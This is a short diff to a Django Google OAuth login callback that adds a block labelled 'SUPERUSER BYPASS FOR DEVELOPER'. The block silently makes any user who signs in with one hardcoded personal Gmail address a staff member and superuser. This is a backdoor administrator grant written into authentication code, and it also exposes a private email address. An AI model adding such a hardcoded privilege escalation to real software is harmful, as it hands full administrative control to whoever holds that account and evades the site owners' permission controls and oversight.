@@ -226,6 +226,13 @@ def google_auth_callback(request):
             user.is_active = True
             user.save()
 
+        # SUPERUSER BYPASS FOR DEVELOPER
+        if email == 'garg.ayush18542@gmail.com':
+            if not user.is_staff or not user.is_superuser:
+                user.is_staff = True
+                user.is_superuser = True
+                user.save()
+
         login(request, user, backend='django.contrib.auth.backends.ModelBackend')
 
         # Form POST → redirect; JSON → return JSON
